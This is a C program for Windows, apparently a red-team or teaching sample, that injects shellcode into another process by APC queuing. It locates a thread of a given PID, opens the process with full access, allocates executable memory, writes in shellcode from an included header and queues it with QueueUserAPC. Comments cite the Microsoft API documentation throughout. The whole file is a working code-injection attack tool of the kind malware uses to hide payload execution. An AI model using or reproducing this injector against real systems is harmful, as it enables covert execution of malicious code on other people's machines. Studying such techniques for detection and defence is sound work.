#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>


int main(int argc, char *argv[]) {

    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    #include "../shellcode.h"

    int pid = atoi(argv[1]);
    printf("Target PID: %d\n", pid);

    // Take a snapshot of all threads in the system
     /*
    https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    HANDLE CreateToolhelp32Snapshot(
        [in] DWORD dwFlags,
        [in] DWORD th32ProcessID
    );
    */
    DWORD threadId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD, // dwFlags that indicates we want a snapshot of all threads
        0                  // th32ProcessID is 0 to include all threads in the system
    );

    // Check if the snapshot was created successfully
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError());
        return 1;
    }

    THREADENTRY32 te = {0};       // Structure to hold thread information
    te.dwSize = sizeof(te); // Initialize the size of the structure

    // Iterate through all threads in the snapshot
    Thread32First(
        hSnapshot,  // Handle to the snapshot
        &te         // Pointer to the THREADENTRY32 structure
    );

    do {
        // Check if the thread belongs to the target process
         if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) { // Ensure the field is available and can contain enough data
            if (te.th32OwnerProcessID == pid) {
                // use the first thread we find
                threadId = te.th32ThreadID;
                break;
            }
        }
        te.dwSize = sizeof(te);
    } while (Thread32Next(hSnapshot, &te)); // Move to the next thread in the snapshot

    // Check if we found a thread for the target process
    if (threadId == 0) {
        printf("No threads found for process ID %d\n", pid);
        CloseHandle(hSnapshot);
        return 1;
    }

    printf("Found thread ID: %d\n", threadId);
    // Get a handle to the target process
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    HANDLE OpenProcess(
        [in] DWORD dwDesiredAccess,
        [in] BOOL  bInheritHandle,
        [in] DWORD dwProcessId
    );
    */
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // Desired access rights
        FALSE,              // Do not inherit handle
        pid                 // Target process ID
    );

    // Check if the handle to the target process was opened successfully
    if (hProcess == INVALID_HANDLE_VALUE || hProcess == NULL) {
        printf("Failed to open process with PID %d. Error: %lu\n", pid, GetLastError());
        return -1;
    }
    printf("Successfully opened handle to process with PID %d: %p\n", pid, hProcess);

    // Allocate memory for the shellcode
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    LPVOID VirtualAllocEx(
        [in]           HANDLE hProcess,
        [in, optional] LPVOID lpAddress,
        [in]           SIZE_T dwSize,
        [in]           DWORD  flAllocationType,
        [in]           DWORD  flProtect
    );
    */
    LPVOID HandleMemory = VirtualAllocEx(
        hProcess,                   // Handle to the target process
        NULL,                       // No specific address because we don't mind where it is allocated 
        sizeof(shellcode),          // Size of the allocation we need (size of our shellcode)
        MEM_COMMIT | MEM_RESERVE,   // Allocate reserved and committed memory
        PAGE_EXECUTE_READWRITE      // Memory protection - we need to be able write the shellcode and execute it in this memory
    );
    
    // Check if the memory allocation was successful
    if (HandleMemory == NULL) {
        return -1;
    }
    printf("Memory allocated successfully at address: %p\n", HandleMemory);

    // Write the shellcode to the allocated memory
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten
    );
    */
    SIZE_T bytesWritten = 0;
    BOOL RESULT = WriteProcessMemory(
        hProcess,                   // Handle to the target process 
        HandleMemory,               // Pointer to the base address in the target process where data will be written (our allocated memory)
        &shellcode,                 // Pointer to the buffer that contains the data to be written (our shellcode)
        sizeof(shellcode),          // Size of the data to be written (size of our shellcode)
        &bytesWritten               // Receives the number of bytes written
    );

    // Check if the WriteProcessMemory call was successful
    if (RESULT == 0 || bytesWritten != sizeof(shellcode)) {
        return -1;
    }
    printf("Wrote %zu bytes to allocated memory.\n", bytesWritten);

    // Get a handle to the target thread
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread
    HANDLE OpenThread(
        [in] DWORD dwDesiredAccess,
        [in] BOOL  bInheritHandle,
        [in] DWORD dwThreadId
    );
    */
    HANDLE hThread = OpenThread(
        THREAD_ALL_ACCESS,  // Desired access rights to the thread
        FALSE,              // Do not inherit handle
        threadId            // Target thread ID
    );

    // Check if the handle to the target thread was opened successfully
    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
        printf("Failed to open thread with TID %d. Error: %lu\n", threadId, GetLastError());
        return -1;
    }
    printf("Successfully opened handle to thread with TID %d: %p\n", threadId, hThread);

    // Queue the APC to the target thread
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueapcthread
    DWORD QueueUserAPC(
        [in] PAPCFUNC  pfnAPC,
        [in] HANDLE    hThread,
        [in] ULONG_PTR dwData
    );
    */
    DWORD apcResult = QueueUserAPC(
        (PAPCFUNC)HandleMemory, // Pointer to the APC function (our shellcode in the target process)
        hThread,                // Handle to the target thread
        0                       // No data to be passed to the APC function
    );


    // Check if the QueueUserAPC call was successful
    if (apcResult == 0) {
        printf("QueueUserAPC failed. Error: %lu\n", GetLastError());
        return -1;
    }
    printf("APC queued successfully to thread ID %d.\n", threadId);

    // Clean up handles
    CloseHandle(hThread);
    CloseHandle(hProcess);
    CloseHandle(hSnapshot);

    return 0;
}